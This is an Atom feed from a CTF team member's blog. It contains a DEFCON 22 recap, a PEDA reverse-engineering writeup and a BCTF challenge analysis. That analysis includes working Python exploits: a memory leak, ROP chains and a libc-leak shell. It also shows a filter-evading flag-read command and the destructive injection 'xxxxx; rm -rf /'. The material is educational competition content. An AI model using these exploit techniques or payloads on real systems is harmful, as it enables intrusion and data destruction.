<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Ctf | From Zero To X]]></title>
  <link href="http://blog.ztrix.me/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://blog.ztrix.me/"/>
  <updated>2014-08-21T16:01:17+08:00</updated>
  <id>http://blog.ztrix.me/</id>
  <author>
    <name><![CDATA[zTrix]]></name>
    <email><![CDATA[i@ztrix.me]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[DEFCON 22 CTF 总结]]></title>
    <link href="http://blog.ztrix.me/blog/2014/08/20/defcon-22/"/>
    <updated>2014-08-20T15:51:16+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/08/20/defcon-22</id>
    <content type="html"><![CDATA[<p>Las Vegas 归来已经几天，时差还不经意地骚扰我，顿感身体素质实在不行。</p>

<p>今年 blue-lotus 最终拿到了第五名，还算是一个不错的成绩，于是记录一下今年的得失与教训，回味一下这两周的精彩。</p>

<!-- more -->


<p>吸取了去年航班延误的教训，今年提前了两天出发，于 8 月 5 日出发，继续坐最便宜的 UA888。去年延误给的 10% off 的 coupon 在真正购买机票的时候居然不能使用，不得不怒吐一槽。</p>

<p>巧的是在北京国际机场碰上了即将去 blackhat 演讲的教主 <a href="http://weibo.com/tombkeeper">tombkeeper</a>，近距离感受了一下 “面有萌色，心有丘壑" 的大师风范。路上我们一直期待教主给我们讲讲段子，特别是演示一下如何给出一个 <a href="http://weibo.com/1401527553/BfXaRiG4j">“小伙子好好干”</a> 眼神，可惜一直未能如愿。</p>

<p>今年的赛前准备做的还是比较充分的，比赛前两天又继续增强了通用防御的一些技术和自动攻击框架，同时去超市买了一大堆吃的和饮料（今年领队老师和马杰的签证都悲剧了，目测就要没人给我们各种订餐了，TT）。<a href="https://www.blackhat.com/">Kelwin</a> 还忙里偷闲去 <a href="https://www.blackhat.com/">blackhat</a> 逛了一圈。</p>

<p>然而比赛前还是出现了各种不顺利的事情，首先是 <a href="https://www.blackhat.com/">Kelwin</a> 的 老年 MBP 实在招架不住，镁光 SSD 直接 crash，启动不能（一查居然是多年前的镁光 SSD 固件门，这个发作时间真是巧的无奈），于是 <a href="https://www.blackhat.com/">Kelwin</a> 信用卡一掏，立刻去 apple store 买了一个新的 rmbp。（估计他想着旧的 MBP 回国换个硬盘还能继续使用，结果回国之后发现遇上机场暴力托运，MBP 的屏幕已坏。。感谢为 blue-lotus 积攒 RP，队长功不可没。。）</p>

<p>第二件不顺利的事情在于现场的网络环境配置。今年的环境和去年又有所不同，虽然仍然是一根网线进来，但是内网和外网通过 tagged vlan 来区分，然而我们并没有带支持 vlan 的网络设备。虽然临时买了一个 linksys 高端路由器号称支持 vlan，但是试用之后发现不能同时支持两个 vlan，只好放弃。</p>

<p>5 号早上 9 点赶到现场搭建网络，10 点就会开始比赛，于是只有紧张的一个小时来配置 vlan，好在我们带了几个额外的机器，于是就先取 mac mini。悲剧的事情是我们没有显示器，在我一次强制断电之后，mac mini 似乎直接挂了，不能启动，没办法只好借了一个显示器过来，发现 mac mini 在漫无休止地检查硬盘。于是前功尽弃，只好立刻换另外一个 samsung 笔记本来作为网关，又折腾了很久，等完全折腾好网络，队员可以同时正常访问内外网的时候，已经 12 点了，于是开赛一个小时的时间又手忙脚乱的就浪费掉了，和去年一样，硬件准备还是不够充分，一开赛就甚为慌乱，实在不是一个好事情，这里不得不检讨。</p>

<p>第三件不顺利的事情仍然来自于硬件准备，虽然带够了网络设备，网线，插线板，但是我方设备仍然实在太弱，网线都很短，插线板也很短，乱七八糟的散乱在地上，队员进出实在不便，好几次碰掉了电源，幸好没有碰掉网线造成悲剧。但是看其他队伍各种高大上的设备箱，还带有五颜六色灯光闪烁效果，就知道差距太大。未来如果还有机会，至少要带线足够长的网线和插线板，全部部署在桌子上，井井有条，至少给自己队员带来心理上的条理感，不至于太过慌乱。此乃一个教训。</p>

<h2>8 月 8 日，比赛第一天</h2>

<p>比赛形式与去年大同小异，甚至连规则都不发布了。仍然是 odroid 的 ARMv7 开发板，所不同的是，使用了 qemu 运行了 x86 等不同架构的 binary，甚至还有个 badge，是 MSP430 单片机，于是今年实际上是多架构平台，这增加了不小的挑战。</p>

<p>比赛开始我们就准备部署一些通用防御措施，然而做逆向的童鞋很快发现 binary 里面存在诸如读取 /dev/ctf 来做验证的保护措施，于是只能放弃了一些比较激进的防御措施，先静观其变。</p>

<p><img src="/images/defcon-22/2014-08-08_11-51-51.png" alt="defcon 22 scoreboard" /></p>

<p>上午 11 点，最后的亚军 HITCON 因为做了通用防御无法通过检查，导致服务丢分，暂时排在最末，比赛季军 Dragon Sector 可能也做了类似的事情，导致倒数第二。我们由于发现的早，分数基本没扣，于是暂时排在前列。</p>

<p>今年的服务比去年感觉有所简单，当然也有可能是大家都有了 IDA Arm decompiler 的缘故，刚到下午就开始有队伍得分，分数开始发生变化。</p>

<p><img src="/images/defcon-22/2014-08-08_15-34-25.png" alt="defcon 22 scoreboard" /></p>

<p>HITCON 反应迅速，很快就升到了前面。我们 replay 的速度也不错，加上修补漏洞比较快，于是侥幸排在第二。</p>

<p>第一天感觉下来，在漏洞挖掘上，还是和强队差距很大，我们基本都是在被打的时候，快速反应，快速修补，快速 replay，于是勉强撑过了第一天。第一天结束的时候，我们还没有自己的主动攻击，只有防御做的还算是有一些效果。</p>

<p><img src="/images/defcon-22/2014-08-08_19-35-18.png" alt="defcon 22 scoreboard" /></p>

<p>第一天快结束的时候的分数榜。</p>

<p>结束以后，我们赶紧回住处草草吃了点饭，开始继续分析。</p>

<h2>8 月 9 日，比赛第二天</h2>

<p>一夜的分析还是有所收获的，无论如何，我们是带着主动攻击来了，并且一开赛就可以拿 10 余支队伍的 flag，于是打出了一波小高潮。可惜第二天主办方为了防止分数悬殊太大给后面的队伍带来心理压力以至于放弃，就关闭了分数榜，只留名次榜。</p>

<p>只可惜好景不长，各支队伍修补的速度也很快。到了下午，我们的攻击就基本上无法有效进行了，获取的 flag 也很零星，然后上了新服务，我们四处被打，手忙脚乱，十分狼狈。</p>

<p>经过前一天几乎通宵的分析，到了下午大家也都十分疲倦，cbmixx 直接在椅子上打了瞌睡，libmaru 直接表示太困太吵于是就先回住处了。</p>

<p>第二天的中间几个小时是最煎熬的一段时间。也是非常有可能守不住就不断掉名次的时候。</p>

<p>好在熬了几个小时大家终于稍微能振奋一点了，几个服务修补的也还算及时，虽然被打了不少时间。但是在这种慌乱情况下，我们发现的几个漏洞，都没有时间去写攻击。仅有的几个攻击脚本，也都因为太老，而基本攻击不成，而强队又开始不断的发起新的攻击，PPP 的 justify 新攻击一次性可以拿十几只队伍 flag，HITCON 的 eliza 也非常猛。我们在列强的夹击下非常艰难。</p>

<p>主办方放出了攻击视频 <a href="http://youtu.be/1UT3qXHduts">http://youtu.be/1UT3qXHduts</a> ，有人说我们打法太过保守，既不攻击别人，也不怎么被别人攻击。实际情况是这个时候我们已经四处挨打了，能补上几个漏洞已经是万幸，想要攻击出去早已无力。</p>

<p><img src="/images/defcon-22/2014-08-09_19-06-26.png" alt="defcon 22 scoreboard" /></p>

<p>第一天快结束时的名次，虽然名次还在前面，但是我们心里知道与强队的差距，这是不可忽视的。</p>

<p>今年的防御部分我们确实做了很有效的措施，常见的漏洞都先使用 binary harden 的方法，对栈漏洞，直接进行改大栈帧，对 UAF，直接 patch 掉 free 操作等，于是至少可以挡住第一波的进攻。当稳定下来以后，我们再进一步做深度修补，这取得了非常好的效果。这里不得不提及一下 HITCON 思路新颖，他们的栈漏洞 binary harden 方法是直接把栈迁移到环境变量区，于是在一定程度上使得利用非常困难，甚至可以算是彻底修复了栈漏洞，这个比我们加大栈帧的方法高明了不少，确实是一流队伍出奇招啊。</p>

<p>第二天我们仍然尝试做了几个通用防御，结果要么是过不了 SLA 检查，要么就太过激进被主办方警告了，于是便全部放弃了，只留了 inotify flag 检测。</p>

<p>第二天比赛中间安恒老板范渊，还有腾讯等好几拨人过来给我们带了不少吃的，还有不少人也过来支持鼓励我们，非常感谢！没有领队老师在的时候，都靠业界前辈支持了。只不过我们比赛过程中，实在是又累又困又紧张又慌乱，抽不出空与各位朋友好好交流，并不是某位小编说的态度不可一世爱理不理，这希望能够得到大家理解。</p>

<p>另外不得不再次怒吐一槽的是，Rio 居然强制要求所有赛场队伍必须订他们指定外卖，只能付现金，并且不找零钱，强制霸王条款，让人不可理喻。好玩的是 DEFCON closing ceremony 上立刻就宣布明年就不在 Rio 办了，太贵太坑，明年要去 <a href="http://www.ballyslasvegas.com/">Bally</a></p>

<h2>8 月 10 日，比赛第三天，最后的决战</h2>

<p>比赛最后一天只有 4 个小时，但仍然激烈，程度不亚于第二天，因为会有一大波 0day 四面八方砸来。</p>

<p>经过一个晚上又是几乎一个通宵，我们修补了大部分漏洞，并且又写了几个攻击，于是第三天早上，又打出了一小波攻击，但是无济于事，强队实在过于强大，实际上我猜测分数还是在下降的。这个时候 PPP HITCON 还有 Dragon Sector 都显然比我们强很多，我们后面的 Reckless Abandon 和 Men in black hat 进攻势头也很猛，都很有可能超过我们。</p>

<p>然而第三天还是出现了一些状况，使得状况变得更加糟糕。</p>

<p>第一个比较郁闷的事情是，其中有一个服务我们花了将近 2 个小时修补完了，结果被对手放了后门，并且会自动 fork ，kill 的速度比不过 fork 的速度，于是我们的自动 kill shell 脚本没有把后门 kill 掉。后来我们才知道对于这种后门应该先发送 STOP 信号。于是就这样无辜丢了可能将近 250 分。</p>

<p>第二个也很郁闷的事情是，<a href="https://www.blackhat.com/">kelwin</a> 的 eliza 攻击脚本已经差不多写完了，然而发现远程攻击速度太慢，还是不能正常获取 flag，等于白白浪费了时间，一直到比赛结束都没有能进行自动攻击，非常可惜。</p>

<p>第三个更加郁闷的事情是，badge 服务第三天有队伍进行了 dos 攻击，我们前面分析了很久的 badge，虽然不能攻击，但是对服务比较熟，于是很快 patch 了这个 dos 攻击的漏洞。于是如果这个攻击一直进行的话，我们将会因为别人的服务 down 掉获取很多分数，结果主办方突然就宣布这个 dos 攻击是不允许的，于是 badge 上我们就几乎没有得分，或者也可能拿了其中一两轮的分数，但是由于我们自己刷 rom 还要 down 一两轮，所以最终都不知道是得分了还是丢分了。</p>

<p>badge 是主办方耗费了不少心血设计的题目，很可惜由于出现各种问题，包括中心服务器的问题等，导致 PPP 早就搞定了没有得分，一直到最后才有 Routards 拿分，但是也基本无法改变局势了，不然一定会造成排名大变。对于主办方是一个非常可惜的事情。</p>

<p>另外还有一个很好玩的事情是，许多队伍的通用防御都做了 shell 命令检测过滤，于是大家都开始写花命令来获取 flag。从最开始最简单的 <code>cat flag</code>，后来慢慢越来越复杂，最后命令变成了</p>

<p><code>
A="fla"; B="g"; /usr/b${nyaL}in/ba${blah}se64 "$A$B"
</code></p>

<p>这个检测和防御我们并没有做，如果做的话还是有一定迷惑效果的，以后应该做一下。</p>

<p>由于最后一天主办方完全封榜，看不到分数和排名，大家都是在盲打盲撞，还是比较忐忑的。比赛结束之后，感觉了一下，前三名很可能是 PPP HITCON 和 Dragon Sector，结果果然正好猜中，恭喜他们，特别是 HITCON 和 Dragon Sector 都是第一年参加 DEFCON 决赛，实属不易，令人钦佩。</p>

<p><img src="/images/defcon-22/final.png" alt="defcon 22 scoreboard" /></p>

<p>比赛最终结果在一周后揭晓了，我们处在第五名，与预测差别不大，还是很开心的，毕竟今年实现了突破，实现了快速修补防御，实现了主动攻击，名次上也超过了目标预期，各方面都算是稳步进步了。</p>

<h1>感谢</h1>

<p>最后要感谢安全宝鼎力赞助支持，支持这么多人参加决赛实在是不小的开销。也感谢安恒范渊(给我们买 Pizza 送饮料，帮忙解决不少后勤问题)、腾讯（有两个部门都请我们吃了饭来支持）、<a href="http://weibo.com/tombkeeper">tombkeeper</a> 的鼓励，还有各位来自于阿里等业内公司的朋友，我无法记住全部，在此只能一并道谢！</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Power of PEDA - ASIS CTF Quals 2014 Serial Number Writeup]]></title>
    <link href="http://blog.ztrix.me/blog/2014/05/10/asis-quals-2014-serial-number-writeup/"/>
    <updated>2014-05-10T23:09:41+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/05/10/asis-quals-2014-serial-number-writeup</id>
    <content type="html"><![CDATA[<p>by Wenlei Zhu (zTrix@blue-lotus)</p>

<p>Again, another ELF x86_64 binary with very long bit operation logic asking for some serial number.</p>

<p>I can still remember the time <a href="http://blog.ztrix.me/blog/2014/01/29/phdays-quals-2014-turututu/">trying to solve Turututu</a>, during which I spent a lot of time trying to figure out what happened under the instructions, but sadly with no luck, it&rsquo;s totally a mess. The lucky thing is that <a href="http://github.com/longld/peda">peda</a> is really a powerful tool, and I can guess the hidden logic with the help of <a href="http://github.com/longld/peda">peda</a>, so I finally solved Turututu.</p>

<p>So let&rsquo;s show what a powerful tool <a href="http://github.com/longld/peda">peda</a> is by solving this challenge without figuring out that long bit operation logic(over 1 thousand lines of asm code!).</p>

<!-- more -->


<p>First, it&rsquo;s easy to understand the overall logic. Here is the pseudocode(python-like).</p>

<pre><code>serial_number = some_8_bytes_integer
state = 0   # four bit state
correct_serial = 0

while serial_number &gt; 0:
    nibble = serial_number &amp; 0xf
    serial_number = serial_number &gt;&gt; 4
    correct_serial = nibble == 0xd &amp;&amp; state == 0xd
    state = some_very_long_logic_over_a_thousand_lines_of_asm(nibble, state)

if correct_serial:
    print 'Congratulations!'
</code></pre>

<p>Here, nibble and state are both 4 bit variables. So no matter what the <code>some_very_long_logic_over_a_thousand_lines_of_asm</code> function is, there is only <code>16 x 16 = 256</code> possibilities. Just brute-force them all using <a href="http://github.com/longld/peda">peda</a>!</p>

<p>So I wrote the following <a href="http://github.com/longld/peda">peda</a> helper function, by setting breakpoint at end of <code>some_very_long_logic_over_a_thousand_lines_of_asm</code> and using <code>set $rip=0x400788</code>, we can run that piece of code multiple times.</p>

<p>```python
def god(self, *arg):</p>

<pre><code>"""
god mode
"""
msg('god mode')
rbp = peda.getreg('rbp')
array_pointers = peda.read_int(rbp-0x28, 8)

def get_state():
    ret = []
    for i in range(4):
        pointer = peda.read_int(array_pointers + i * 8, 8)
        ret.append(peda.read_int(pointer + 4, 4))
    return ret

def set_state(state):
    for i in range(4):
        pointer = peda.read_int(array_pointers + i * 8, 8)
        peda.write_int(pointer + 4, state[i], 4)

def check_one(t, init):
    peda.write_int(rbp-0x68, t, 1)
    peda.execute('set $rip=0x400788')

    # msg('extracted = %d%d%d%d, remain = %x' % (peda.read_int(rbp-0x44, 4), peda.read_int(rbp-0x48, 4), peda.read_int(rbp-0x4c, 4), peda.read_int(rbp-0x50, 4), peda.read_int(rbp-0x68, 8)))

    set_state(init)
    peda.execute('continue')
    state2 = get_state()

    return state2

final = []
for i in range(16):
    init = [i &amp; 1, (i &gt;&gt; 1) &amp; 1, (i&gt;&gt;2) &amp; 1, (i&gt;&gt;3) &amp; 1]
    for j in range(16):
        rs = check_one(j, init)
        msg('%x: %s -&gt; %s' % (j, init, rs))
        final.append((j, init, rs))

msg('%s' % final)
return
</code></pre>

<p>```</p>

<p>So, the only thing left is <code>gdb -x gdb.x</code>, here it is.</p>

<pre><code>file serial-number
b *0x4014d8
b *0x40149c
run
</code></pre>

<p>Then use god mode to brute force.</p>

<p>After brute force and a little processing, we can get the following jump table</p>

<pre><code>0 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 0, 0]
1 [0, 0, 0, 0, 9, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
2 [0, 10, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
3 [3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3]
4 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 12]
5 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 13, 0, 0, 0, 0, 0]
6 [0, 0, 0, 0, 0, 14, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
7 [7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7]
8 [0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0]
9 [0, 0, 0, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
10 [0, 0, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
11 [11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11]
12 [0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0]
13 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
14 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0]
15 [15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15]
</code></pre>

<p>So the serial number is <code>da34c5217f9d</code>.</p>

<p>Can you feel the power of <a href="http://github.com/longld/peda">peda</a> tonight?</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BCTF 2014 决赛题 - Secret Guard 回顾与分析]]></title>
    <link href="http://blog.ztrix.me/blog/2014/05/07/bctf-secret-guard/"/>
    <updated>2014-05-07T09:08:55+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/05/07/bctf-secret-guard</id>
    <content type="html"><![CDATA[<p>by Wenlei Zhu (zTrix@blue-lotus)</p>

<p><a href="/downloads/secret-guard.7594d1be5c8e9a13c98676c6b516f5ce">secret-guard</a> 作为 BCTF 2014 决赛中最简单的一道 binary 题目，设计目标为，能够在放出后 4 个小时左右被各队逐渐解出，达到一波得分高潮。漏洞设置方面，设置了 3 个不同类型的简单漏洞，分别属于信息泄露、栈溢出和命令注入，期望是各个队伍发现不同的漏洞，达到互有攻防，反复抢占阵地的激烈效果。</p>

<p>根据比赛的实际情况来看，题目足够简单，作为最简单的 binary 题目，4 个小时内被解出的目标完成了，但是没有想到的是，在很长的一段时间内，只有 HITCON 217 一个队伍解出这道简单题目，并且只利用了其中命令注入的最简单漏洞。赛后的交流得知，开始时很多人以为每个题目只有一个漏洞，于是找到漏洞之后，就去看别的题目了，没有再仔细研究这个题目。另外，不知道是由于此题攻击流量分析较为困难还是各个队伍经验较少的原因，所有其他队伍一直处于被打状态而没有及时修补，导致得分差距太大，所以总体感觉甚为惋惜，花费心思设置的各个漏洞和坑点大家都没有遇到，也没有达到预期的效果。</p>

<h2>关于这题的一些统计信息</h2>

<!-- more -->


<table>
<thead>
<tr>
<th></th>
<th> 队伍     </th>
<th align="center">      攻击次数      </th>
<th align="center">  被攻击次数 </th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td> HITCON 217    </td>
<td align="center"> 716 </td>
<td align="center"> 0   </td>
</tr>
<tr>
<td></td>
<td> 0ops          </td>
<td align="center"> 379 </td>
<td align="center"> 12  </td>
</tr>
<tr>
<td></td>
<td> DISA          </td>
<td align="center"> 307 </td>
<td align="center"> 79  </td>
</tr>
<tr>
<td></td>
<td> Light4Freedom </td>
<td align="center"> 229 </td>
<td align="center"> 575 </td>
</tr>
<tr>
<td></td>
<td> Pax.Mac Team  </td>
<td align="center"> 197 </td>
<td align="center"> 91  </td>
</tr>
<tr>
<td></td>
<td> Sigma         </td>
<td align="center"> 137 </td>
<td align="center"> 86  </td>
</tr>
<tr>
<td></td>
<td> 我是狗汪汪    </td>
<td align="center"> 87  </td>
<td align="center"> 661 </td>
</tr>
<tr>
<td></td>
<td> 无名          </td>
<td align="center"> 284 </td>
<td align="center"> 116 </td>
</tr>
</tbody>
</table>


<br/>


<h2>总体服务状态</h2>

<ul>
<li>1 &ndash; down</li>
<li>31 &ndash; error</li>
<li>1597 &ndash; ok</li>
</ul>


<h2>漏洞分析</h2>

<p>首先要看懂程序逻辑，作为 secret guard，它打开的第一个秘密文件其实就是 flag 文件。并且将 flag 的前一半作为 secret key。每次连接服务，可以给一个随机数种子，然后获得 secret key 中的一个 byte。</p>

<p>随后，程序会向用户询问 16 个关于 secret key 的问题，如果全部答对，才能得到 access 权限。</p>

<p>取得权限之后，用户可以输入一个 pid，然后程序会调用 lsof 命令，打印出这个 pid 打开的秘密文件有哪些。</p>

<h3>漏洞一 &ndash; 任意信息泄露漏洞</h3>

<p>首先，随机数种子确定的时候，随机数的序列是固定的。因此很容易找到一个序列，让他们作为随机种子之后，随机得到 0 1 2 &hellip; 15 的序列。有了这个序列之后，是可以轻松获得 flag 的前面一半的。</p>

<p>```python</p>

<h1><a href="http://github.com/zTrix/zio">http://github.com/zTrix/zio</a></h1>

<p>from zio import *</p>

<p>def get_char(p):</p>

<pre><code>io = zio((host, port), print_write = COLORED(REPR))
io.read_until('sneak peek')

io.writeline(p)
io.read_until('here: ')
line = io.readline().strip()
io.readline()
io.close()
return line
</code></pre>

<p>def get_flag_first_half():</p>

<pre><code>tbl = [12, 65, 22, 9, 36, 7, 18, 1, 8, 17, 2, 5, 16, 4, 23, 10]

half = []
for s in tbl:
    half.append(get_char(str(s)))

return ''.join(half)
</code></pre>

<p>```</p>

<p>仔细分析可以发现，0x401480(sneak_peek) 这个函数是有溢出漏洞的，除了 <code>\r \n</code> 之外，可以覆盖其他任意字符到栈上高位。但是这个函数有 stack canary 保护，因此没法直接利用 return address 来控制 EIP。不过这个 stack frame 内部的变量是可以任意覆盖的，只要变量的地址在 buf 和 canary 之间。进一步分析，可以发现，获取随机种子之后，程序会打印出栈上某个指针所指字符串的一个字母，而这个指针是可以覆盖的。</p>

<p>原始代码如下，也就是下面的 <code>big_secret</code> 是可以覆盖的，于是可以直接把这个变量覆盖成 <code>flag_bss</code>，从而泄漏一个字节。总共 32 次就可以泄漏完整的 flag</p>

<p><code>cpp
srand(seed);
p = rand() % len;
printf("Your piece of secret here: %c\n", big_secret[p]);
</code></p>

<p>第一个漏洞的攻击代码如下：</p>

<p>```python
flag_bss = 0x402420</p>

<p>def pwn1():</p>

<pre><code>flag = []
for index in range(32):
    ad = flag_bss + index
    seed = 12
    if ad &amp; 0xff in (0xd, 0xa):
        seed = 65
        ad -= 1
    p = str(seed) + ' ' * 14 + l64(16) * 2 + l64(ad)
    flag.append(get_char(p))

return ''.join(flag)
</code></pre>

<p>```</p>

<p>这个漏洞与 openssl heartbleed 漏洞有几分相似，可以泄漏内存中任意地址信息，每次一个 byte，效率略低，但是对于 flag 来说足够了。</p>

<p>这个漏洞的修补并不困难，buffer 读入的时候，检查一下大于 16 就退出循环即可。</p>

<h3>漏洞二 &ndash; 栈溢出漏洞</h3>

<p>在程序问 16 个问题的函数中，存在第二个漏洞，并且是一个裸的 buffer overflow 漏洞。每次回答问题的输入，会被 gets 函数读入，而 gets 是一个非常危险的函数。</p>

<p>这个漏洞比较简单，直接构造 ROP chain 打印 flag 即可。注意 <code>printf</code> 进入之前需要 al 寄存器设置为 0，否则会崩溃，具体原因没有深究，<code>0x400f10</code> 是一个返回值为 0 的函数，可以用来设置 rax 为 0.</p>

<p>```python</p>

<h1><a href="http://github.com/zTrix/zio">http://github.com/zTrix/zio</a></h1>

<p>from zio import *</p>

<p>def pwn2():</p>

<pre><code>io = zio(target, print_write = COLORED(REPR), timeout = 10000, write_delay = 0)
io.read_until('sneak peek')
io.writeline('s')
io.read_until('to access:')
io.read_until('?') 
pop_ret = 0x00401a63
system = 0x400d70
printf = 0x400c60
gets = 0x400da0
scanf = 0x400d40
strlen = 0x402258
# io.gdb_hint()
io.writeline('_' * 16 + 'AAAA' + l64(0x1) + 'A' * 4 + l64(flag_bss) + 'A' * 8 + 'B' * 8 + l64(0x400f10) + l64(pop_ret) + l64(flag_bss) + l64(printf) + l64(scanf))
io.print_read = REPR
io.read()
io.interact()
</code></pre>

<p>```</p>

<p>如果想从这个漏洞拿 shell，就需要泄漏一次地址再跳回程序，利用稍微麻烦一点</p>

<p>```python</p>

<h1><a href="http://github.com/zTrix/zio">http://github.com/zTrix/zio</a></h1>

<p>from zio import *</p>

<p>def pwn3():</p>

<pre><code>io = zio(target, print_write = COLORED(REPR), timeout = 10000, write_delay = 0)
io.read_until('sneak peek')
io.writeline('s')
io.read_until('to access:')
io.read_until('?') 
pop_ret = 0x00401a63
system = 0x400d70
printf = 0x400c60
gets = 0x400da0
scanf = 0x400d40
strlen = 0x402258
answer = 0x401710
init = 0x400f10
io.writeline('_' * 16 + 'AAAA' + l64(0x1) + 'A' * 4 + l64(flag_bss) + 'A' * 8 + 'B' * 8 + l64(init) + l64(pop_ret) + l64(strlen) + l64(printf) + l64(pop_ret) + l64(flag_bss) + l64(answer))
io.print_read = REPR
io.readline()
io.readline()
addr = io.read(6)
strlen_libc = l64(addr.ljust(8, '\x00'))
libc_base = strlen_libc - 0x81c40
binsh = libc_base + 1443474
log('addr = %s, strlen_libc = %x, libc_base = %x, binsh = %x' % (repr(addr), strlen_libc, libc_base, binsh), 'red')
io.readline()
# io.gdb_hint()
io.writeline('_' * 16 + 'AAAA' + l64(0x1) + 'A' * 4 + l64(flag_bss) + 'A' * 8 + 'B' * 8 + l64(pop_ret) + l64(binsh) + l64(system))
flag = io.readline()
io.writeline('cat /home/flags/secret-guard/flag; exit;')
# flag = io.readline()
flag = io.read()
io.close()
return flag
</code></pre>

<p>```</p>

<p>这个漏洞的修补更加简单，直接把 gets 改成 getchar 即可，但是换行可能会吃掉导致逻辑错误，因此可能需要两个 getchar</p>

<h3>漏洞三 &ndash; 命令注入漏洞</h3>

<p>漏洞三就是比赛队伍一直在利用的 shell injection 漏洞。原理和利用都比较简单，这里就不再赘述了。设计这个漏洞的时候，因为太过简单，就把它放在了程序最后，具有一定的隐蔽性。因此可能造成了不少队伍很晚才发现这个漏洞。</p>

<p>当初设计这个漏洞，同时还有两个目的：</p>

<ul>
<li>纪念 <a href="http://weibo.com/d34dc47">D3AdCa7</a> 童鞋去年 defcon 决赛中，因为写了未加检查的 curl 提交 flag 脚本，因此被别人 flag 中的 <code>xxxxx; rm -rf /</code> 删除了整个系统。好在由于权限原因，重要的个人文件资料并未删除。</li>
<li>提醒大家重视 shell injection，特别是 shell 脚本中，很容易未加检查就信任输入，造成 injection。</li>
</ul>


<p>比较巧合的事情是，<a href="http://weibo.com/d34dc47">D3AdCa7</a>  童鞋的 defcon 遭遇居然在这次决赛中又重演了，而且，就是在这个我设置了 shell injection 漏洞的地方，本意是提醒大家，结果有的队伍直接修改返回为 <code>xxxxx; rm -rf /</code>，我发现这个问题的时候，立刻过去要求他们去掉，恶作剧一下即可，如果真造成损失就不好了，但是没想到当时就已经有其他队伍中招了，并且是不止一个队员。</p>

<p>不知道中招情况如何，但是感觉题目本意想达到的提醒大家注意 shell injection 漏洞的效果被这次意外完成了，无论是中招的童鞋，还是事后谈论的童鞋，应该都会有所防范吧。</p>

<h2>题目总结</h2>

<p>总体来看，虽然是一道不难的题目，但是还是花了不少心思来设计的，有些设计目标达到了，但是也很遗憾没有达到预期结果，特别是前面两个漏洞都没有人利用。</p>

<p>题目中还设置了一些坑点，增加题目趣味性</p>

<ul>
<li>为了防止大家过于容易修改 flag 文件路径，我写了一个山寨 base64 解码得到文件地址。其实和程序逻辑没有什么关系，但是听说有队伍逆向了半天这个 base64，LOL</li>
<li>为了防止大家抓包之后不经分析就直接重放流量，设置了两个障碍

<ol>
<li>各队 flag 各不相同，因此同样的流量，不能回答正确 16 个问题</li>
<li>每次只能获取一个 byte 的信息，因此想回答 16 个问题，至少需要连接 16 次，这样抓包后，攻击流量就会在不同的 TCP stream 中，给分析流量造成一定困难。</li>
</ol>
</li>
<li>另外，ROP chain 的构造中，还有设置 AL 寄存器为 0 的坑，这个不是故意设计的，而是 ABI 方面的坑</li>
</ul>


<p><a href="/downloads/secret-guard.7594d1be5c8e9a13c98676c6b516f5ce">题目文件下载</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PlaidCTF 2014 - Parlor (Crypto 250) Writeup]]></title>
    <link href="http://blog.ztrix.me/blog/2014/04/14/plaidctf-2014-parlor-writeup/"/>
    <updated>2014-04-14T21:12:55+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/04/14/plaidctf-2014-parlor-writeup</id>
    <content type="html"><![CDATA[<p>by Wenlei Zhu (zTrix@blue-lotus)</p>

<p>Problem description</p>

<pre><code>Crypto (250 pts)

The Plague is running a betting service to build up funds for his massive empire. Can you 
figure out a way to beat the house? The service is running at 54.197.195.247:4321.
</code></pre>

<!-- more -->


<p>use nc to connect the service, we got the following screen</p>

<pre><code>/------------------------------------------------------------------------------\
| Welcome to the betting parlor!                                               |
|                                                                              |
| We implement State of the Art cryptography to give you the fairest and most  |
| exciting betting experience!                                                 |
|                                                                              |
| Here's how it works: we both pick a nonce, you tell us odds, and you give us |
| some money.                                                                  |
| If md5(our number + your number) % odds == 0, you win bet amount*odds.       |
| UPDATE: IF YOU DIDN'T REALIZE IT, WE DO INCLUDE A NEWLINE AT THE END OF YOUR |
| NUMBER. SORRY FOR THE INCONVENIENCE. THANK YOU FOR USING PARLOR              |
| Otherwise, we get your money! We're even so nice, we gave you $1000 to start.|
|                                                                              |
| If you don't trust us, we will generate a new nonce, and reveal the old nonce|
| to you, so you can verify all of our results!                                |
|                                                                              |
| (Oh, and if you win a billion dollars, we'll give you a flag.)               |
\______________________________________________________________________________/

====================
  1) set your odds
  2) set your bet
  3) play a round
  4) get balance
  5) reveal nonce
  6) quit
====================
</code></pre>

<p>So, it&rsquo;s a small betting game, if we can win enough money, we&rsquo;ll get a flag.</p>

